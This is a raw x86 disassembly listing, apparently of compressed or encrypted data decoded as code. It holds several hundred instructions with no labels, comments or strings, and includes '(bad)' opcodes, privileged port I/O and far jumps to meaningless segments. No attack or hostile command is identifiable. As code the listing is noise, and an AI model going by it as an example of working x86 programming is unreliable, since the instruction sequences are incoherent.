  424cf6:	or     al,0xec
  424cf8:	shl    BYTE PTR [esi],1
  424cfa:	pop    esi
  424cfb:	sub    dl,al
  424cfd:	pushf  
  424cfe:	pop    esi
  424cff:	dec    ebp
  424d00:	mov    eax,0xdd9b5380
  424d05:	outs   dx,BYTE PTR ds:[esi]
  424d06:	not    DWORD PTR [ebx+0x35]
  424d09:	xchg   ebx,eax
  424d0a:	cli    
  424d0b:	pop    es
  424d0c:	mov    esi,0xc379e6c9
  424d11:	(bad)
  424d14:	in     eax,dx
  424d15:	shr    DWORD PTR ds:0x15cd92cb,1
  424d1b:	stos   BYTE PTR es:[di],al
  424d1d:	ficom  WORD PTR [edx]
  424d1f:	push   esi
  424d20:	mov    ch,BYTE PTR [edx-0x665e3099]
  424d26:	out    0xd5,al
  424d28:	adc    eax,0x120af450
  424d2d:	aam    0xa9
  424d2f:	jb     0x424cfd
  424d31:	dec    eax
  424d32:	or     ch,bh
  424d34:	js     0x424d60
  424d36:	jmp    0x4929:0x3072aa19
  424d3d:	add    al,BYTE PTR [ecx]
  424d3f:	sbb    al,dl
  424d41:	add    DWORD PTR [edx+0x5d4686a7],ecx
  424d47:	cld    
  424d48:	(bad)
  424d4d:	popa   
  424d4e:	dec    ebp
  424d4f:	inc    edx
  424d50:	lea    eax,[ecx]
  424d52:	sbb    eax,0x80a1da67
  424d57:	push   esp
  424d58:	or     ecx,DWORD PTR [ebp+edx*8+0xc2b6e7c]
  424d5f:	xchg   ebp,eax
  424d60:	inc    ecx
  424d61:	mov    al,0x6
  424d63:	mov    bl,0x7d
  424d65:	mov    cl,0x84
  424d67:	xor    esi,0x2fcb54bd
  424d6d:	popf   
  424d6e:	fs pop es
  424d70:	inc    esp
  424d71:	jle    0x424d0c
  424d73:	jl     0x424d1b
  424d75:	mov    dl,0xbb
  424d77:	cmp    BYTE PTR [ecx],ah
  424d79:	sbb    DWORD PTR [ecx-0x4c38ced1],edi
  424d7f:	cmc    
  424d80:	iret   
  424d81:	sar    esp,cl
  424d83:	cdq    
  424d84:	jns    0x424d71
  424d86:	inc    ecx
  424d87:	xor    bh,ch
  424d89:	xchg   ebp,eax
  424d8a:	pop    es
  424d8b:	imul   ecx,DWORD PTR [edi],0x3534637d
  424d91:	repnz leave 
  424d93:	gs or  al,0x15
  424d96:	and    ch,BYTE PTR [edi+ebx*2]
  424d99:	out    dx,eax
  424d9a:	mov    ds:0x1dd81987,eax
  424d9f:	sbb    BYTE PTR [ebx+ebx*1],bl
  424da2:	sub    BYTE PTR [ebp+0x3b],cl
  424da5:	imul   edx,DWORD PTR [ecx-0x175428b7],0x96e3113
  424daf:	lahf   
  424db0:	xor    eax,0x975b3028
  424db5:	mov    edx,0xdb8ba07e
  424dba:	shl    esp,1
  424dbc:	in     al,dx
  424dbd:	inc    esp
  424dbe:	xchg   edx,eax
  424dbf:	ds ret 0xd4b8
  424dc3:	xchg   esi,eax
  424dc4:	fs dec esi
  424dc6:	jae    0x424d95
  424dc8:	mov    ebx,0x356b0e70
  424dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dce:	dec    ebx
  424dcf:	add    BYTE PTR [ebx-0x20c6e912],al
  424dd5:	sbb    ebp,DWORD PTR [eax+eiz*2]
  424dd8:	rol    BYTE PTR [eax+0x21],cl
  424ddb:	xchg   ebx,eax
  424ddc:	bound  eax,QWORD PTR [ebx-0xfdbbfe4]
  424de2:	fucomi st,st(4)
  424de5:	(bad)  
  424de7:	lods   al,BYTE PTR ds:[esi]
  424de8:	push   ss
  424de9:	mov    ds:0xc74137dd,eax
  424dee:	ins    DWORD PTR es:[edi],dx
  424def:	xor    ch,ah
  424df1:	pop    esp
  424df2:	test   dl,cl
  424df4:	mov    WORD PTR [edi-0x63],cs
  424df7:	fnstcw WORD PTR [ecx-0x532025b9]
  424dfd:	lock push 0x6e2c8be3
  424e03:	aas    
  424e04:	call   DWORD PTR [edi]
  424e06:	jg     0x424df4
  424e08:	mov    dh,0x9b
  424e0a:	loope  0x424e47
  424e0c:	mov    ds:0xc169251c,al
  424e11:	test   DWORD PTR [ecx-0xc051b23],esp
  424e17:	push   eax
  424e18:	(bad)  
  424e19:	test   al,0x97
  424e1b:	cdq    
  424e1c:	fsubrp st(7),st
  424e1e:	pop    edx
  424e1f:	jge    0x424e80
  424e21:	fild   QWORD PTR [edi-0x1b]
  424e24:	inc    ebx
  424e25:	sbb    eax,0xa8e0bdc5
  424e2a:	jo     0x424dd7
  424e2c:	add    edi,ebx
  424e2e:	push   ecx
	...
  424e37:	add    BYTE PTR [eax],al
  424e39:	add    BYTE PTR [edx+ebp*1+0x2b],ch
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	add    bh,BYTE PTR [eax+0x2f]
  424e49:	dec    esp
  424e4a:	mov    ds:0xfd0001c6,al
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    BYTE PTR [edx],bh
  424e53:	hlt    
  424e54:	mov    esp,0x2e014641
  424e59:	pop    ebx
  424e5a:	push   cs
  424e5b:	ins    DWORD PTR es:[edi],dx
  424e5c:	adc    BYTE PTR cs:[ebp+0x6914630d],bl
  424e63:	sar    DWORD PTR [ecx-0x4859f7d],0xcc
  424e6a:	fsub   st,st(7)
  424e6c:	pop    edi
  424e6d:	or     eax,0x47fa2da0
  424e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e73:	and    dh,al
  424e75:	outs   dx,DWORD PTR ds:[esi]
  424e76:	sbb    DWORD PTR [eax+0x2e],ebp
  424e79:	enter  0x2413,0x2f
  424e7d:	(bad)  
  424e7e:	ja     0x424e04
  424e80:	int3   
  424e81:	ja     0x424eea
  424e83:	dec    ebx
  424e84:	and    DWORD PTR [eax+0x464fc154],0x9abfb1d6
  424e8e:	pop    ecx
  424e8f:	fbld   TBYTE PTR [edi]
  424e91:	xor    al,0x2
  424e93:	fnstsw WORD PTR [ebx-0x711782c8]
  424e99:	lea    edx,[eax-0x2e]
  424e9c:	mov    al,0x4a
  424e9e:	adc    eax,DWORD PTR [esi-0x63]
  424ea1:	nop
  424ea2:	jne    0x424f14
  424ea4:	sub    edx,DWORD PTR [edi+0x3e]
  424ea7:	and    DWORD PTR [ebx-0x6630ae65],eax
  424ead:	std    
  424eae:	cwde   
  424eaf:	(bad)  
  424eb0:	jp     0x424e7b
  424eb2:	aas    
  424eb3:	inc    edi
  424eb4:	loop   0x424ed3
  424eb6:	pop    ebx
  424eb7:	mov    edx,0x67bfc168
  424ebc:	push   eax
  424ebd:	clc    
  424ebe:	add    esp,DWORD PTR [esp+ecx*4-0x2]
  424ec2:	xchg   edi,eax
  424ec3:	arpl   WORD PTR [edi+0xf5ff876],dx
  424ec9:	int    0x1c
  424ecb:	(bad)  
  424ecc:	fmul   QWORD PTR [ebx+0x78266d45]
  424ed2:	pop    edi
  424ed3:	jmp    DWORD PTR [eax-0x46]
  424ed6:	mov    bl,BYTE PTR [edx+0x5e]
  424ed9:	pop    ds
  424eda:	leave  
  424edb:	nop
  424edc:	fstp   DWORD PTR [ecx-0x22]
  424edf:	cdq    
  424ee0:	cmp    edi,DWORD PTR [edi-0x73]
  424ee3:	jbe    0x424eeb
  424ee5:	and    dh,BYTE PTR [eax]
  424ee7:	jge    0x424ee6
  424ee9:	das    
  424eea:	out    dx,al
  424eeb:	sbb    eax,0xa35f6e39
  424ef0:	sub    al,ah
  424ef2:	outs   dx,DWORD PTR ds:[esi]
  424ef3:	sub    al,BYTE PTR [ecx]
  424ef5:	jle    0x424f75
  424ef7:	mov    dh,0x8a
  424ef9:	popf   
  424efa:	je     0x424f32
  424efc:	mov    gs,WORD PTR [edi]
  424efe:	out    dx,eax
  424eff:	lods   eax,DWORD PTR ds:[esi]
  424f00:	dec    edi
  424f01:	mov    ebp,0x2d7303a
  424f06:	push   cs
  424f07:	je     0x424eb3
  424f09:	call   0xa280:0x3f10b836
  424f10:	ins    DWORD PTR es:[edi],dx
  424f11:	mov    esp,0xbd77cc9c
  424f16:	or     DWORD PTR [ebx],edx
  424f18:	cli    
  424f19:	mov    eax,ds:0xcc965608
  424f1e:	xor    BYTE PTR [esi+edi*8-0x12],al
  424f22:	ss jne 0x424f82
  424f25:	sub    edi,DWORD PTR [ebx]
  424f27:	popf   
  424f28:	mov    ds:0x686da71a,al
  424f2d:	sbb    al,0xb3
  424f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f30:	mov    edi,0xde1d616d
  424f35:	dec    edx
  424f36:	rcr    eax,cl
  424f38:	pop    ecx
  424f39:	ret    0x56ad
  424f3c:	xor    BYTE PTR [esp+eax*4-0x47],ah
  424f40:	call   FWORD PTR [edx+0x5da083c3]
  424f46:	cli    
  424f47:	or     esi,edx
  424f49:	mov    BYTE PTR [ebx-0x1578af59],bh
  424f4f:	idiv   BYTE PTR [edx]
  424f51:	xchg   edx,eax
  424f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f53:	sub    dl,BYTE PTR [eax]
  424f55:	add    eax,0x23397f83
  424f5a:	or     DWORD PTR [eax+0x206b9c16],0x3d
  424f61:	and    DWORD PTR [ebx-0x74],0xfffffffd
  424f65:	loop   0x424f53
  424f67:	dec    esi
  424f68:	inc    edx
  424f69:	jmp    0x424fb6
  424f6b:	jl     0x424fce
  424f6d:	sbb    DWORD PTR [ebp+eiz*1+0x54],esp
  424f71:	or     DWORD PTR [ebx],0xe59649b8
  424f77:	call   0xb4af2710
  424f7c:	inc    eax
  424f7d:	pop    ecx
  424f7e:	dec    ebp
  424f7f:	dec    ecx
  424f80:	sahf   
  424f81:	xchg   ebp,eax
  424f82:	gs push edx
  424f84:	inc    ebx
  424f85:	jmp    DWORD PTR [eax-0x3]
  424f88:	sar    DWORD PTR [ebx],cl
  424f8a:	mov    ds:0x206859c9,eax
  424f8f:	int    0xc2
  424f91:	rcr    BYTE PTR [ebx-0x2f3988c0],0x93
  424f98:	cdq    
  424f99:	jae    0x424f4a
  424f9b:	lods   eax,DWORD PTR fs:[esi]
  424f9d:	int3   
  424f9e:	mov    ah,0x54
  424fa0:	(bad)  
  424fa1:	popa   
  424fa2:	shr    BYTE PTR [edx-0x4],cl
  424fa5:	iret   
  424fa6:	shl    BYTE PTR [edi],0xca
  424fa9:	push   edx
  424faa:	dec    sp
  424fac:	repz mov esi,0x3d140d47
  424fb2:	xchg   ebx,eax
  424fb3:	lock dec ebx
  424fb5:	rol    DWORD PTR [edx],0x2e
  424fb8:	sbb    al,0x62
  424fba:	dec    edx
  424fbb:	dec    ebx
  424fbc:	pop    ss
  424fbd:	or     DWORD PTR [ebp+0x31e00ba1],ebp
  424fc3:	repz inc edi
  424fc5:	clc    
  424fc6:	add    DWORD PTR [edi-0x64d03e92],0xa249ee3b
  424fd0:	fmul   QWORD PTR [ebp+0x2846c7bc]
  424fd6:	out    dx,eax
  424fd7:	add    bh,dh
  424fd9:	sbb    eax,0x79fa35e9
  424fde:	push   ecx
  424fdf:	and    DWORD PTR [edi+0x68],ebp
  424fe2:	and    dl,BYTE PTR [esi-0x5c]
  424fe5:	ss jae 0x424fbe
  424fe8:	add    DWORD PTR [ebx-0x51],edi
  424feb:	scas   al,BYTE PTR es:[edi]
  424fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fed:	or     dl,dh
  424fef:	mov    ecx,0x5fac4c86
  424ff4:	aas    
  424ff5:	push   ecx
  424ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ff7:	mov    ch,0xd1
  424ff9:	jmp    0xcfae5585
  424ffe:	repnz es retf 
  425001:	cdq    
  425002:	push   0x1
  425004:	add    al,0x8f
  425006:	outs   dx,BYTE PTR ds:[esi]
  425007:	sub    al,0xb7
  425009:	lods   al,BYTE PTR ds:[esi]
  42500a:	xlat   BYTE PTR ds:[ebx]
  42500b:	ror    edi,0x8
  42500e:	out    dx,al
  42500f:	lods   al,BYTE PTR ds:[esi]
  425010:	(bad)  
  425011:	jmp    0x8542:0xef72c95f
  425018:	push   ebx
  425019:	pop    ebp
  42501a:	jmp    0x4835474c
  42501f:	adc    al,0xa
  425021:	jns    0x424fe1
  425023:	sub    eax,0x8ab7d9bb
  425028:	xor    al,0x69
  42502a:	mov    WORD PTR [edx+0x5066f26f],ds
  425030:	stos   BYTE PTR es:[edi],al
  425031:	gs int 0xca
  425034:	mov    dh,0xec
  425036:	push   ebx
  425037:	(bad)  
  425039:	ror    BYTE PTR [ebx-0x7715d76],0xc8
  425040:	jb     0x425051
  425042:	mov    cl,0x45
  425044:	(bad)  
  425045:	push   ss
  425046:	mov    ebp,0xd63deca3
  42504b:	or     BYTE PTR [ebx+0x74],0xeb
	...
  425057:	add    BYTE PTR [eax],al
  425059:	add    BYTE PTR [ebx-0x73],al
  42505c:	pop    ds
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0xe4
  425067:	fbld   TBYTE PTR [esi-0x4a]
  42506a:	lahf   
  42506b:	enter  0x1,0xfd
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [ecx+0x41],dh
  425074:	adc    al,0x76
  425076:	out    0x9b,al
  425078:	jecxz  0x4250b9
  42507a:	xchg   BYTE PTR [esi+ecx*2-0x63],dl
  42507e:	in     al,0x3a
  425080:	std    
  425081:	jae    0x42505d
  425083:	pop    ebx
  425084:	ret    0x6e86
  425087:	mov    ds:0x2e756b48,eax
  42508c:	mov    WORD PTR [esi],?
  42508e:	xor    bh,dh
  425090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425091:	es adc ecx,edx
  425094:	add    cl,BYTE PTR [esi-0x2e]
  425097:	data16 cmp al,0x61
  42509a:	fnstenv [ebx-0x77]
  42509d:	lea    ebx,[edx-0x29]
  4250a0:	or     BYTE PTR [eax+eiz*4+0x854260d],bl
  4250a7:	jp     0x425070
  4250a9:	dec    esp
  4250aa:	rol    BYTE PTR [ebx],cl
  4250ac:	int    0xd9
  4250ae:	test   al,0x84
  4250b0:	ds jnp 0x425080
  4250b3:	lods   al,BYTE PTR ds:[esi]
  4250b4:	aam    0x1d
  4250b6:	cmp    al,0x97
  4250b8:	mov    ebx,0x40f98450
  4250bd:	push   0x6e21a076
  4250c2:	lahf   
  4250c3:	cmp    dl,bl
  4250c5:	xchg   edx,eax
  4250c6:	push   ds
  4250c7:	push   esi
  4250c8:	adc    BYTE PTR [ebx-0x1d],dl
  4250cb:	cmp    ebx,DWORD PTR [edi]
  4250cd:	pop    ss
  4250ce:	pop    ds
  4250cf:	xchg   edi,eax
  4250d0:	cdq    
  4250d1:	add    DWORD PTR [edi+0x8],0x52
  4250d5:	into   
  4250d6:	push   es
  4250d7:	and    dl,BYTE PTR [esi+0x3b]
  4250da:	mov    ebx,0x90ec8ab8
  4250df:	bound  ebp,QWORD PTR [ebx-0xa26e5fd]
  4250e5:	sbb    DWORD PTR [ebp+0x138c28d1],esi
  4250eb:	dec    ebx
  4250ec:	ins    DWORD PTR es:[edi],dx
  4250ed:	bound  edi,QWORD PTR [esi+edi*4+0x3f]
  4250f1:	jbe    0x42510d
  4250f3:	fisubr DWORD PTR [ebx-0x12]
  4250f6:	pop    esi
  4250f7:	pop    ebx
  4250f8:	sbb    eax,0x35803af5
  4250fd:	add    eax,0x65a77b78
  425102:	jl     0x42512f
  425104:	das    
  425105:	dec    esi
  425106:	and    BYTE PTR ds:0x322219fa,al
  42510c:	pop    ebx
  42510d:	mov    bl,0x7c
  42510f:	pop    eax
  425110:	sub    DWORD PTR [edi-0xb],0x1463199f
  425117:	mov    edi,0x3077133a
  42511c:	push   cs
  42511d:	dec    edi
  42511e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42511f:	dec    esp
  425120:	xchg   esi,eax
  425121:	mov    ds:0x39b93eac,eax
  425126:	and    BYTE PTR [esi+0x7],ch
  425129:	adc    al,BYTE PTR [ecx+edx*2-0x1a]
  42512d:	bound  esp,QWORD PTR [eax]
  42512f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425130:	sub    DWORD PTR [ebx-0x34a54e8c],edi
  425136:	imul   ebp,edi,0x72c2ead4
  42513c:	add    ch,BYTE PTR [ecx+0x6a]
  42513f:	and    ah,bh
  425141:	xchg   edx,esp
  425143:	sbb    BYTE PTR [esi+0x18ee0f7e],ch
  425149:	mov    cl,0x15
  42514b:	sbb    al,0xb3
  42514d:	xor    eax,0xc9acf717
  425152:	shl    DWORD PTR [ebx],0xfb
  425155:	aas    
  425156:	pop    edx
  425157:	jmp    0x9636:0xa18d90ba
  42515e:	mov    bh,0x26
  425160:	lods   al,BYTE PTR ds:[esi]
  425161:	mov    cl,0x63
  425163:	hlt    
  425164:	xchg   edx,ecx
  425166:	xlat   BYTE PTR ds:[ebx]
  425167:	and    cl,bl
  425169:	imul   eax,eax,0xffffffc5
  42516c:	je     0x425100
  42516e:	not    esi
  425170:	hlt    
  425171:	fdivr  st,st(0)
  425173:	pop    ebx
  425174:	inc    ebx
  425175:	inc    edx
  425176:	push   edx
  425177:	adc    esi,DWORD PTR [edi]
  425179:	mov    edx,DWORD PTR [ebx+ebx*2-0x6]
  42517d:	add    BYTE PTR [esi+eiz*4-0x42],dh
  425181:	shl    DWORD PTR [edi-0x31af7794],0xa2
  425188:	dec    esp
  425189:	mov    al,ds:0xba405fd
  42518e:	mov    eax,ds:0xc513a9c6
  425193:	call   0x6ed5884
  425198:	xchg   esp,eax
  425199:	sbb    BYTE PTR [edi-0x37bf2ff4],al
  42519f:	rol    BYTE PTR [ecx-0x27],cl
  4251a2:	sub    DWORD PTR gs:[ecx+eax*4+0x1b9b3ee6],ebp
  4251aa:	push   eax
  4251ab:	test   BYTE PTR [ebx+0x411c9b8a],ah
  4251b1:	repnz or ch,al
  4251b4:	dec    edx
  4251b5:	dec    edx
  4251b6:	ficomp WORD PTR [ebx]
  4251b8:	pop    gs
  4251ba:	call   0xc0d6b669
  4251bf:	es dec edi
  4251c1:	clc    
  4251c2:	jns    0x425205
  4251c4:	mov    ebx,ebp
  4251c6:	mov    ds:0xe37d1a76,eax
  4251cb:	sub    esp,edi
  4251cd:	add    edi,ecx
  4251cf:	sti    
  4251d0:	pop    esi
  4251d1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4251d3:	test   BYTE PTR [ebp+0x45],0x3e
  4251d7:	rcr    DWORD PTR [esi],1
  4251d9:	mov    edx,0x58580d36
  4251de:	xor    DWORD PTR [ecx-0x1aa07195],ebp
  4251e4:	and    al,0x5d
  4251e6:	and    BYTE PTR [eax],bl
  4251e8:	sbb    ebx,DWORD PTR ds:0x5b921066
  4251ee:	sbb    al,0x20
  4251f0:	sti    
  4251f1:	cwde   
  4251f2:	and    DWORD PTR [esi+0x483989e4],edx
  4251f8:	ficom  WORD PTR [edx+0x2a898126]
  4251fe:	push   ebx
  4251ff:	fmulp  st(5),st
  425201:	test   DWORD PTR [ebx+0x7d841dad],edx
  425207:	in     eax,0x98
  425209:	sahf   
  42520a:	(bad)  
  42520b:	xor    BYTE PTR [edx-0x6e869491],dl
  425211:	xchg   DWORD PTR [edi-0xd],ecx
  425214:	shl    DWORD PTR [ecx-0x2175fd5a],0xf
  42521b:	jle    0x42522f
  42521d:	dec    edx
  42521e:	inc    esi
  42521f:	mov    ecx,0x42d84328
  425224:	pop    ebp
  425225:	ss push 0x572e7751
  42522b:	or     edx,edx
  42522d:	sbb    edi,DWORD PTR ds:0x5894b5ec
  425233:	jbe    0x425257
  425235:	mov    ds:0x51b2637,al
  42523a:	cmp    BYTE PTR [ebx],dl
  42523c:	xor    ebp,DWORD PTR [edi+0x4c]
  42523f:	std    
  425240:	ret    0x827
  425243:	adc    eax,0x33722b8
  425248:	ss lock adc ah,ch
  42524c:	mov    ds:0x8b83188b,al
  425251:	scas   eax,DWORD PTR es:[edi]
  425252:	pop    esp
  425253:	push   esi
  425254:	retf   
  425255:	push   ss
  425256:	or     edx,eax
  425258:	mov    ecx,0xf28d57ae
  42525d:	and    eax,DWORD PTR [edx]
  42525f:	je     0x425244
  425261:	push   ebp
  425262:	sub    eax,0xadb6fadc
  425267:	fcmovb st,st(4)
  425269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42526a:	dec    eax
  42526b:	in     eax,dx
  42526c:	mov    gs,WORD PTR [edx+0xdd]
	...
  42527a:	hlt    
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	xchg   esp,eax
  425287:	loope  0x4252ec
  425289:	xlat   BYTE PTR ds:[ebx]
  42528a:	pushf  
  42528b:	retf   0x1
  42528e:	std    
  42528f:	add    DWORD PTR [eax],eax
  425291:	add    BYTE PTR [edi-0x97aaa85],al
  425297:	xchg   ebp,eax
  425298:	dec    edx
  425299:	xor    dh,BYTE PTR [edx+esi*2+0x65a68c2d]
  4252a0:	mov    BYTE PTR [edi-0x268e87b7],cl
  4252a6:	not    dl
  4252a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252a9:	or     esi,DWORD PTR [ebp-0x9651b98]
  4252af:	aam    0x24
  4252b1:	and    eax,DWORD PTR [esi]
  4252b3:	icebp  
  4252b4:	idiv   BYTE PTR [ebx-0x1e]
  4252b7:	test   eax,0x6b23b541
  4252bc:	sbb    DWORD PTR [eax+0x4af3390d],ecx
  4252c2:	stos   BYTE PTR es:[edi],al
  4252c3:	les    esi,FWORD PTR [ecx+0x19]
  4252c6:	mov    DWORD PTR [edx+ebp*2+0x21],0x66a29bbc
  4252ce:	jg     0x42534c
  4252d0:	(bad)  
  4252d1:	push   ebp
  4252d2:	mov    bh,0x11
  4252d4:	sbb    al,BYTE PTR [ebx+0x1d]
  4252d7:	cmp    cl,BYTE PTR [esp+ebx*2]
  4252da:	scas   al,BYTE PTR es:[edi]
  4252db:	mov    ds:0xae2b7629,eax
  4252e0:	mov    edi,0x1bece043
  4252e5:	jno    0x4252e1
  4252e7:	pop    esi
  4252e8:	loop   0x425298
  4252ea:	pop    esi
  4252eb:	pop    esp
  4252ec:	sbb    eax,0xe852703d
  4252f1:	loopne 0x42536a
  4252f3:	and    al,cl
  4252f5:	and    esi,DWORD PTR [ebp-0x5cc56a5f]
  4252fb:	sti    
  4252fc:	mov    al,0x45
  4252fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252ff:	pop    ebx
  425300:	mov    ?,WORD PTR [ecx+0x17f8d86e]
  425306:	(bad)  
  425307:	jmp    0x42535d
  425309:	outs   dx,DWORD PTR ds:[esi]
  42530a:	loopne 0x4252ff
  42530c:	cwde   
  42530d:	add    dh,BYTE PTR [esi+0x96012]
  425313:	jno    0x425325
  425315:	and    bl,al
  425317:	jo     0x425308
  425319:	cdq    
  42531a:	jg     0x425368
  42531c:	aam    0x91
  42531e:	inc    ecx
  42531f:	(bad)  [edx+edi*2]
  425322:	xor    DWORD PTR [eax+0x4f],ecx
  425325:	xchg   ecx,eax
  425326:	inc    esp
  425327:	sbb    eax,0xe1aeb45a
  42532c:	xor    eax,0x4471b768
  425331:	in     al,0xa6
  425333:	pop    ss
  425334:	push   eax
  425335:	adc    bh,BYTE PTR [eax+eax*1+0x51]
  425339:	xchg   ebx,eax
  42533a:	mov    esp,0xbd6f0313
  42533f:	xlat   BYTE PTR ds:[ebx]
  425340:	in     eax,0x8b
  425342:	out    dx,al
  425343:	imul   eax,DWORD PTR [ebp-0x945439d],0x5ae1f2a4
  42534d:	push   ss
  42534e:	dec    ebp
  42534f:	out    dx,eax
  425350:	fdivr  DWORD PTR [esi]
  425352:	mov    edx,0xb1e8cc9d
  425357:	popa   
  425358:	mov    ah,0x5e
  42535a:	push   ecx
  42535b:	dec    edi
  42535c:	rcr    BYTE PTR [ebp-0x31],cl
  42535f:	das    
  425360:	nop
  425361:	push   ss
  425362:	ret    
  425363:	dec    edx
  425364:	pop    es
  425365:	push   edx
  425366:	fistp  WORD PTR [edi]
  425368:	pop    ss
  425369:	outs   dx,BYTE PTR ds:[esi]
  42536a:	pop    edx
  42536b:	inc    ebp
  42536c:	iret   
  42536d:	or     ch,bh
  42536f:	xlat   BYTE PTR ds:[ebx]
  425370:	cmc    
  425371:	pop    ds
  425372:	test   cl,0x89
  425375:	gs call 0xa288:0x35f283b0
  42537d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42537e:	out    dx,eax
  42537f:	repz sub eax,DWORD PTR [ebx+0x7153a3fe]
  425386:	mov    ds:0xbc3dd306,eax
  42538b:	adc    ch,BYTE PTR [ebp+0x64]
  42538e:	movlps xmm2,QWORD PTR [edx+0x5db6b54]
  425395:	sub    BYTE PTR [edx+0x7a],bl
  425398:	inc    esi
  425399:	sbb    eax,0x566dc402
  42539e:	out    dx,eax
  42539f:	shr    BYTE PTR [edx],1
  4253a1:	push   ds
  4253a2:	repnz (bad) 
  4253a4:	in     al,dx
  4253a5:	scas   eax,DWORD PTR es:[edi]
  4253a6:	mov    ebp,0xf36a2ad5
  4253ab:	icebp  
  4253ac:	jl     0x4253c6
  4253ae:	ret    0x8f70
  4253b1:	push   edx
  4253b2:	or     eax,0x71161142
  4253b7:	inc    edi
  4253b8:	loope  0x425381
  4253ba:	push   ebx
  4253bb:	xor    BYTE PTR [ebp+0x2],al
  4253be:	push   es
  4253bf:	or     BYTE PTR [ebp+0xa549535],dl
  4253c5:	mov    eax,ds:0x51f3c2d0
  4253ca:	shl    DWORD PTR [ecx+0x2df73b7c],0x9f
  4253d1:	cmp    ebp,ecx
  4253d3:	loopne 0x425356
  4253d5:	ret    
  4253d6:	mov    es:0x11cd078a,eax
  4253dc:	add    al,0xc2
  4253de:	fucom  st(6)
  4253e0:	pop    edx
  4253e1:	in     al,0xeb
  4253e3:	inc    esi
  4253e4:	add    eax,0x3f8f3562
  4253e9:	pushf  
  4253ea:	xchg   esp,eax
  4253eb:	pop    esi
  4253ec:	fwait
  4253ed:	in     al,0xc3
  4253ef:	mov    ecx,0x2eb27aeb
  4253f4:	sbb    eax,DWORD PTR [esi+0x1f0d2aa3]
  4253fa:	pop    ebp
  4253fb:	cmc    
  4253fc:	push   esp
  4253fd:	imul   eax,DWORD PTR [ebp+0x4860f099],0xb35d0c25
  425407:	sahf   
  425408:	mov    WORD PTR [ebp+0x224f3993],fs
  42540e:	jae    0x42547d
  425410:	jecxz  0x4253bb
  425412:	shr    BYTE PTR [ebp+0x4d],cl
  425415:	dec    edi
  425416:	scas   eax,DWORD PTR es:[edi]
  425417:	pop    es
  425418:	mov    ebx,0x733f13e3
  42541d:	dec    esi
  42541e:	cmc    
  42541f:	out    0xdd,eax
  425421:	repnz sub DWORD PTR [esi+eiz*4-0x1b],0x69
  425427:	push   esp
  425428:	push   eax
  425429:	stos   DWORD PTR es:[edi],eax
  42542a:	cld    
  42542b:	sub    eax,0x97213889
  425430:	push   ebp
  425431:	pop    ss
  425432:	sbb    dl,BYTE PTR [eax-0x4c4f974c]
  425438:	mov    dl,0xb2
  42543a:	add    ch,BYTE PTR [edi]
  42543c:	shl    BYTE PTR [esi+0x710c48e9],1
  425442:	pop    eax
  425443:	sti    
  425444:	add    BYTE PTR [eax-0x69160225],cl
  42544a:	imul   ecx,DWORD PTR [edi],0xffffffa3
  42544d:	push   ecx
  42544e:	idiv   DWORD PTR [ebx]
  425450:	dec    ebp
  425451:	rcr    BYTE PTR [esi+0x36fda983],1
  425457:	mov    eax,ds:0xa72a99a4
  42545c:	or     al,BYTE PTR [ecx+ebx*1+0x22]
  425460:	stc    
  425461:	bnd je 0x42547e
  425464:	test   eax,0xfac99393
  425469:	add    eax,0x55d8702a
  42546e:	sub    DWORD PTR [ebp+eax*4-0x1ce67cd6],edx
  425475:	js     0x425461
  425477:	mov    ecx,0xc3444ba1
  42547c:	jmp    0x425449
  42547e:	nop
  42547f:	icebp  
  425480:	xchg   esp,eax
  425481:	push   eax
  425482:	gs lock inc ecx
  425485:	jb     0x4254a8
  425487:	add    ebp,0x216cb080
  42548d:	sti    
  42548e:	xor    eax,0x0
  425493:	add    BYTE PTR [eax],al
  425495:	add    BYTE PTR [eax],al
  425497:	add    BYTE PTR [eax],al
  425499:	add    BYTE PTR [esi+edi*1+0x24],dl
  42549d:	sbb    DWORD PTR [esi+0x1b],ebp
  4254a0:	jge    0x425521
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	outs   dx,BYTE PTR ds:[esi]
  4254a7:	data16 fld TBYTE PTR [edx+0x1cc99]
  4254ae:	std    
  4254af:	add    DWORD PTR [eax],eax
  4254b1:	add    BYTE PTR [ebx-0x52a2678b],al
  4254b7:	sub    eax,0xe9211635
  4254bc:	dec    esp
  4254bd:	or     al,0x5f
  4254bf:	add    DWORD PTR [ecx+0x2ba9dc53],ebx
  4254c5:	leave  
  4254c6:	mov    al,ds:0xc0bfc3d6
  4254cb:	pop    edi
  4254cc:	fiadd  DWORD PTR [ecx+eax*8]
  4254cf:	mov    ebx,0x4debae5a
  4254d4:	mov    ah,0xfd
  4254d6:	(bad)  
  4254d7:	out    0x44,al
  4254d9:	(bad)  
  4254da:	das    
  4254db:	mov    ecx,0x71b3b79a
  4254e0:	frstor [edx-0x74087643]
  4254e6:	mov    ?,WORD PTR [edx]
  4254e8:	(bad)
  4254eb:	jae    0x425510
  4254ed:	dec    esi
  4254ee:	push   eax
  4254ef:	mov    esp,0x577c3d69
  4254f4:	or     BYTE PTR [edx-0x5c42a45a],ah
  4254fa:	jo     0x4254cb
